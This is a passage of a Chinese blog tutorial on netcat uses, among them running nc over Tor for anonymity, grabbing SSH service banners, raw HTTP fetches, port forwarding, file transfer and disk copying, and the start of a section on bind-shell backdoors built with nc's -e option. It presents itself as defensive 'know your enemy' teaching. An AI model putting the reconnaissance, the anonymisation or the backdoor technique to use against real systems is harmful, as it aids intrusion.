-<h2 id="★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）"><a href="#★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）" class="headerlink" title="★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）"></a>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</h2><h3 id="◇使用场景-3"><a href="#◇使用场景-3" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　如果你想用 nc 干一些“不为人知”的事情，首先要考虑的是——如何消除【网络层面】的踪迹。<br>　　最容易想到的当然就是——让 nc 走暗网（比如 Tor）。本文以下部分称之为【nc over Tor】。<br>　　顺便说一下：“原版 nc”【不支持】代理，而 nc 的“OpenBSD 变种”支持各种代理。这是两种 nc 之间的关键性差异之一。</p>
-<h3 id="◇方法-3"><a href="#◇方法-3" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：<code>-X</code> 与 <code>-x</code></p>
-<p><strong>选项 <code>-x</code></strong><br>　　该选项表示【代理的位置】，以 <code>x.x.x.x:xxx</code> 的形式表示（中间是【半角冒号】）。</p>
-<p><strong>选项 <code>-X</code></strong><br>　　该选项表示【代理的类型】，含义如下：</p>
-<table>
-<thead>
-<tr>
-<th>选项值</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>5</td>
-<td>SOCKS5 代理</td>
-</tr>
-<tr>
-<td>4</td>
-<td>SOCKS4 代理</td>
-</tr>
-<tr>
-<td>connect</td>
-<td>CONNECT 型的 HTTP 代理</td>
-</tr>
-</tbody></table>
-<p>　　首先，确保你本机已经运行了 Tor；<br>　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 <code>succeeded</code>（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-X</span> 5 <span class="hljs-selector-tag">-x</span> 127.0.0.1<span class="hljs-selector-pseudo">:9050</span> <span class="hljs-selector-tag">-q</span> 3 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443<br><br><span class="hljs-selector-tag">Connection</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443 <span class="hljs-selector-tag">port</span> <span class="hljs-selector-attr">[tcp/https]</span> <span class="hljs-selector-tag">succeeded</span>!<br></code></pre></td></tr></table></figure>
-<p>（注：如果你用的是“Tor Browser”，上述命令中的“<code>-x</code> 选项值”改为 <code>127.0.0.1:9150</code>）</p>
-<h3 id="◇补充说明：延时退出"><a href="#◇补充说明：延时退出" class="headerlink" title="◇补充说明：延时退出"></a>◇补充说明：延时退出</h3><p>　　在上述举例中，俺用到了一个新的 <code>-q</code> 选项。主要考虑到：本博客的 Web Server 位于【公网】。<br>　　当你用 nc 连接【公网】上的服务器，因为【公网】的传输质量会受到诸多因素的影响，最好加 <code>-q</code> 选项，让 nc【延时】退出。<br>　　在俺的示例中，延时3秒。实际操作时，要根据你的网络环境调整。</p>
-<h3 id="◇补充说明：Tor-暗网的好处"><a href="#◇补充说明：Tor-暗网的好处" class="headerlink" title="◇补充说明：Tor 暗网的好处"></a>◇补充说明：Tor 暗网的好处</h3><p>　　关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br>　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。</p>
-<h3 id="◇补充说明：域名解析"><a href="#◇补充说明：域名解析" class="headerlink" title="◇补充说明：域名解析"></a>◇补充说明：域名解析</h3><p>　　当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br>　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。</p>
-<h3 id="◇补充说明：设置别名（alias）"><a href="#◇补充说明：设置别名（alias）" class="headerlink" title="◇补充说明：设置别名（alias）"></a>◇补充说明：设置别名（alias）</h3><p>　　如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure>
-<p>　　设置好之后，你只要用 <code>nc-tor</code> 就可以自动追加代理选项。<br>　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br>　　再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 <code>9050</code> 是用于“裸 Tor”。</p>
-<h2 id="★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）"><a href="#★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）" class="headerlink" title="★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）"></a>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</h2><h3 id="◇使用场景-4"><a href="#◇使用场景-4" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　入侵者在发起攻击之前，有一个很重要的步骤叫做【信息收集】。攻击者对目标了解得越多，得手的机会就越大。<br>　　下面俺以 SSH Server（sshd）举例。</p>
-<h3 id="◇方法-4"><a href="#◇方法-4" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br>　　如果某个服务器运行了 SSH 服务端（默认监听端口是 <code>22</code>），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP <span class="hljs-number">22</span><br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>选项 <code>-v</code></strong><br>　　玩这招时，最好加 <code>-v</code> 选项——nc 会先显示“端口已经连上”或者“端口连不上”。</p>
-<p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p>
-<p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p>
-<p>　　前面聊了这么久，一直没有给出【实例】。现在来一个【真实的】例子——用 nc 探测 Github 的 SSH 端口<br>　　（注：在如下终端窗口中，头一行是命令，后面两行是输出）</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span><br><br>Connection <span class="hljs-keyword">to</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span> port [tcp/ssh] succeeded!<br>SSH-<span class="hljs-number">2.0</span>-babeld-dae25663<br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇补充说明：echo-命令"><a href="#◇补充说明：echo-命令" class="headerlink" title="◇补充说明：echo 命令"></a>◇补充说明：echo 命令</h3><p>　　上述用到的 <code>echo</code> 命令是 POSIX 下常用的命令。Windows 的命令行中也有同名的命令，但功能/用法有【差异】。</p>
-<h3 id="◇补充说明：批处理-＆-自动化"><a href="#◇补充说明：批处理-＆-自动化" class="headerlink" title="◇补充说明：批处理 ＆ 自动化"></a>◇补充说明：批处理 ＆ 自动化</h3><p>　　某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br>　　另外，<br>　　有的系统管理员会把 sshd 的监听端口从 <code>22</code> 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br>　　攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。</p>
-<h3 id="◇补充说明：防范措施"><a href="#◇补充说明：防范措施" class="headerlink" title="◇补充说明：防范措施"></a>◇补充说明：防范措施</h3><p>　　本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br>　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br>　　一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。</p>
-<h2 id="★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问"><a href="#★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问" class="headerlink" title="★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问"></a>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问</h2><h3 id="◇使用场景-5"><a href="#◇使用场景-5" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　有时候，俺想要看某个 Web 服务器上的某个页面的内容，但是又【不希望】在那上面留下俺本人的任何痕迹。这里所说的“痕迹”既包括【网络】层面滴，也包括【操作系统 ＆ 软件】层面滴。<br>　　要搞定【网络】层面，很简单——主要靠【暗网】（Tor or I2P），来掩盖你的【真实】“公网 IP”。具体的玩法，前面章节已经聊过啦。<br>　　要搞定【操作系统 ＆ 软件】层面，稍微麻烦一点。如果你用传统的浏览器（Chrome、Firefox、IE、Edge …）访问了某个页面。即使你禁用了 JS，伪造了浏览器的“User Agent”。但如果 Web 服务器想要收集你的系统指纹，还是有若干办法——可以通过浏览器的一些差异，获得某些信息量（安全行话叫做“浏览器指纹”）。<br>　　比如说：HTTP 协议的【Header】字段可能会包含某些信息。<br>　　比如说：不同内核的浏览器，对页面的渲染会有差异。对页面中的【外部】元素（图片、JS、CSS …）的加载效率也会有差异。<br>　　比如说：即使同一款浏览器，在不同系统平台上，依然会表现出某些差异。<br>　　……</p>
-<p>　　此时，nc 再度派上用场——你可以用 nc 直接抓取页面，保存到本机。<br>　　这种玩法相当于——让 nc 在【裸 TCP】层面执行 HTTP 协议的命令。在整个过程中，浏览器完全【不】参与其中。既【不会】暴露浏览器的信息，也【不会】暴露操作系统的信息。</p>
-<h3 id="◇方法-5"><a href="#◇方法-5" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　先执行下列两个命令的其中一个（具体看你想用“IP”还是“域名”）</p>
-<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure>
-
-<p>　　然后 nc 就会把这个页面抓下来，打印到命令行终端。这时候你看到的是【HTML 源代码】。</p>
-<p>　　上述命令访问的是 Web Server 的【根路径】。如果你想要看其它路径的页面（比如说：<code>/index.html</code>），稍微修改成如下：</p>
-<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure>
-
-<p>　　由于正常人类是无法直接阅读【HTML 源代码】滴。为了更加人性化，你可以把 nc 抓下来的 HTML 源代码，（在命令行中用“大于号”）重定向到某个 HTML 文件，然后就可以用你本机的浏览器阅读之。</p>
-<p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p>
-<p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p>
-<h3 id="◇补充说明：HTTP-协议"><a href="#◇补充说明：HTTP-协议" class="headerlink" title="◇补充说明：HTTP 协议"></a>◇补充说明：HTTP 协议</h3><p><strong>协议版本</strong><br>　　有些同学会奇怪——为啥俺上述的示例用的是 1.0 而不是 1.1？<br>　　主要是为了偷懒——按照 RFC 的规范，HTTP 1.1 的 Request 中，<code>Host</code> 是【必须】的字段；而在 HTTP 1.0 中，这个字段是【可选】滴。</p>
-<p><strong>HTTPS</strong><br>　　nc 的“OpenBSD 变种”还【不】支持 HTTPS（SSL/TLS）。<br>　　在本文末尾介绍的其它变种里面，ncat ＆ socat 已经完全支持 SSL/TLS 协议。<br>　　由于本文主要介绍 nc 的“OpenBSD 变种”，关于 ncat ＆ socat 的话题，就不展开啦。</p>
-<h3 id="◇补充说明：这种方式的【缺点】"><a href="#◇补充说明：这种方式的【缺点】" class="headerlink" title="◇补充说明：这种方式的【缺点】"></a>◇补充说明：这种方式的【缺点】</h3><p><strong>关于“页面的【外部】元素”</strong><br>　　用这招，nc 只抓取页面本身，不包括页面中的外部元素（图片、JS、CSS …）。<br>　　这种方式拿到的页面，阅读的时候会显得比较丑陋（你就凑合着看吧）</p>
-<p><strong>关于“JS 引擎”</strong><br>　　由于这招只是在 TCP 层面模拟了简单的 HTTP 协议。所以只能得到【静态 HTML】。<br>　　如果某个页面的内容是依靠【前端 JS】动态生成（所谓的 AJAX 风格），那这招就不灵啦（因为 nc【没有】JS 引擎）。</p>
-<h2 id="★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）"><a href="#★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）" class="headerlink" title="★招数7：（网络配置）基于 nc 的端口转发（Port Forward）"></a>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</h2><h3 id="◇使用场景-6"><a href="#◇使用场景-6" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　关于【端口转发】的相关概念，有啥用处和好处，那篇都已经写了。这里就不再重复唠叨啦。<br>　　在当年那篇教程中，俺主要聊了两个工具，分别是是 rinetd 和 netsh。当年为啥没有介绍 netcat 捏？因为 nc 的功能太强，所谓“杀鸡焉用牛刀”。相比之下，rinetd 的使用非常简单，而 netsh 是 Windows 内置滴工具。<br>　　今天就把当年没聊的给补一下——如何用 nc 玩“端口转发”。</p>
-<h3 id="◇原理"><a href="#◇原理" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br>　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 <code>|</code>），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br>　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br>　　主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。</p>
-<h3 id="◇方法-6"><a href="#◇方法-6" class="headerlink" title="◇方法"></a>◇方法</h3><p><strong>步骤1：创建命名管道</strong><br>　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 <code>nc_pipe</code>。（俺用这个名称只是为了举例，你也可以用别的名称）</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mkfifo nc_pipe</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>步骤2：同时启动两个 nc</strong></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1234</span> &lt; nc_pipe | nc <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">5678</span> &gt; nc_pipe<br></code></pre></td></tr></table></figure>
-<p>　　运行上述命令之后，就可以把本机的 <code>1235</code> 端口重定向到本机的 <code>5678</code> 端口。</p>
-<p>　　这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br>　　如果你比较喜欢刨根问底，俺稍微解释一下：<br>　　上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 <code>nc_pipe</code> 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。</p>
-<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】-1"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】-1" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　参见“招数2”章节中的“补充说明”。</p>
-<h2 id="★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）"><a href="#★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）" class="headerlink" title="★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）"></a>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）</h2><h3 id="◇使用场景-7"><a href="#◇使用场景-7" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　提醒一下：<br>　　【不要混淆】本章节与“招数4”。<br>　　“招数4”聊的是——nc 自己通过代理进行网络访问（nc over Tor）。<br>　　“本章节”聊的是——nc 帮助其它网络软件走代理进行网络访问（XX软件 over nc over Tor）。</p>
-<p>　　比如说，SSH 是很常用的一个安全工具——用来远程操作服务器。<br>　　在某些特殊场合，俺想要通过 SSH 登录某个服务器，但是又【不希望】服务器记录俺本人【真实的】“公网 IP”（“暴露【真实的】公网 IP”等同于“暴露真实身份”）<br>　　说到这里，很多老读者肯定猜到俺说啥——让 SSH 走 Tor 代理（SSH over Tor）。<br>　　但可惜的是：（POSIX 系统中常用的）OpenSSH 客户端【不支持】SOCKS 代理，而 Tor 默认提供的是 SOCKS 代理。这时候，netcat 就派上用场啦——用 nc 把 SSH 的数据流转发到 Tor 的 SOCKS 代理。</p>
-<h3 id="◇方法-7"><a href="#◇方法-7" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于 Github 同时提供了几种不同的访问途径（Web、Git、SSH）。对【每一种】Github 的访问方式，俺都介绍了相应的隐匿措施。<br>　　对 SSH 这种访问方式，当时俺介绍的招数就是——用 nc 进行代理转发（把 SSH 的数据流转发到 Tor）<br>　　既然当年已经聊过了，这里就不重复唠叨啦。对这招感兴趣的同学，请猛击上述链接。</p>
-<h3 id="◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”"><a href="#◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”" class="headerlink" title="◇补充说明：“SSH over Tor”与“Tor over SSH”"></a>◇补充说明：“SSH over Tor”与“Tor over SSH”</h3><p>　　即使懂技术的同学，有时候也会混淆这两者。俺顺便澄清一下：</p>
-<p><strong>Tor over SSH</strong><br>　　这种方式相当于 SSH 作为 Tor 的前置代理。假设你有一个墙外的 SSH server，而且没有被 GFW 屏蔽，就可以用这招，让你的 Tor 客户端通过这个 SSH server 联网。</p>
-<p><strong>SSH over Tor</strong><br>　　这是让 SSH 通过 Tor 网络（暗网）连接到 SSH 服务器，从而隐藏 SSH 客户端的【真实】公网 IP。在这种情况下，SSH 服务器看到的访问者 IP 是“Tor 出口节点的公网 IP”。</p>
-<h2 id="★招数9：（系统管理）用-nc-传输文件"><a href="#★招数9：（系统管理）用-nc-传输文件" class="headerlink" title="★招数9：（系统管理）用 nc 传输文件"></a>★招数9：（系统管理）用 nc 传输文件</h2><h3 id="◇使用场景-8"><a href="#◇使用场景-8" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br>　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br>　　反驳的理由很多——<br>反驳1：这个玩意儿只能在 Windows 上用。<br>反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br>反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br>……<br>　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br>　　俺觉得：<br>1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br>2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。</p>
-<h3 id="◇方法-8"><a href="#◇方法-8" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p>
-<p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p xxx &gt; file<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
-
-<p>　　然后在【发送端】（A 主机）运行如下命令。</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx &lt; file1<br></code></pre></td></tr></table></figure>
-<p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p>
-<h3 id="◇补充说明：nc-的性能优势"><a href="#◇补充说明：nc-的性能优势" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br>　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br>　　如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p>
-<h2 id="★招数10：（系统管理）用-nc-远程备份整个磁盘"><a href="#★招数10：（系统管理）用-nc-远程备份整个磁盘" class="headerlink" title="★招数10：（系统管理）用 nc 远程备份整个磁盘"></a>★招数10：（系统管理）用 nc 远程备份整个磁盘</h2><h3 id="◇使用场景-9"><a href="#◇使用场景-9" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br>　　无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。</p>
-<p>　　考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br>　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br><strong>性能差异</strong>——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br><strong>完整性差异</strong>——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br>　　一般来说，“系统管理员”和“入侵者”更看重第1个差异（性能）；而“数据取证人员”更看重第2个差异（完整性）。</p>
-<h3 id="◇原理-1"><a href="#◇原理-1" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了传输整个磁盘，你需要用到 <code>dd</code> 命令。这玩意儿源自 UNIX，后来也移植到 Linux 和 Windows。<br>　　关于 <code>dd</code> 命令的更详细介绍，可以参见“维基百科”（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Dd_(Unix)">这里</a>）或“Gnu 官网”（<a target="_blank" rel="noopener" href="https://www.gnu.org/software/coreutils/dd">这里</a>）。</p>
-<p>　　通过 <code>dd</code> 命令，你可以把“整个硬盘”（或者硬盘上的某个“物理分区”、“逻辑分区”）dump 成一个文件。<br>　　在本章节，由于最终目的是要【跨主机备份磁盘】，所以并【不】需要真的把 <code>dd</code> 命令的输出保存成文件，而是把 <code>dd</code> 的输出通过管道符（<code>|</code>）重定向给【本机】的 nc，然后让【本机】的 nc 发送到另一台主机的 nc（参见前一个招数）。</p>
-<h3 id="◇方法-9"><a href="#◇方法-9" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于操作物理磁盘会涉及到操作系统的差异，下面俺以 Linux 举例。<br>　　假设你要把 A 主机 <code>/dev/sda</code> 磁盘的【原始数据】整个复制到 B 主机的 <code>/dev/sdb</code> 磁盘。</p>
-<p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p>
-<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">nc -l -p xxx | dd of=<span class="hljs-regexp">/dev/</span>sdb<br></code></pre></td></tr></table></figure>
-
-<p>　　然后在【发送端】（A 主机）运行如下命令。</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">dd <span class="hljs-keyword">if</span>=/dev/sda | nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
-<p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p>
-<h3 id="◇补充说明：nc-的性能优势-1"><a href="#◇补充说明：nc-的性能优势-1" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　如今的存储设备越来越大了。“磁盘”或者“分区”，动不动都是几百个 GB，这时候 nc 的【性能优势】就体现出来啦。<br>　　（具体的原因，前一个章节已经分析过了）</p>
-<h2 id="★招数11：（入侵手法）用-nc-开启【被动】连接型后门"><a href="#★招数11：（入侵手法）用-nc-开启【被动】连接型后门" class="headerlink" title="★招数11：（入侵手法）用 nc 开启【被动】连接型后门"></a>★招数11：（入侵手法）用 nc 开启【被动】连接型后门</h2><p>　　既然聊 netcat，很自然地会聊到“黑客/骇客”的入侵招数。<br>　　做这方面的介绍，并【不是】为了传授入侵技巧；而是为了——让那些注重安全性的同学，能做到“知己知彼”。</p>
-<h3 id="◇使用场景-10"><a href="#◇使用场景-10" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br>　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br>　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br>　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br>　　在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。</p>
-<h3 id="◇原理-2"><a href="#◇原理-2" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了让后门能工作，通常会使用 nc 的 <code>-e</code> 选项，该选项的“选项值”是一个可执行文件的路径。<br>　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br>　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 <code>cmd.exe</code>；对 POSIX 系统（Linux or UNIX）而言，就是 <code>/bin/sh</code><br>　　在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。</p>
-<h3 id="◇入侵方法"><a href="#◇入侵方法" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 <code>xxx</code> 是端口号）</p>
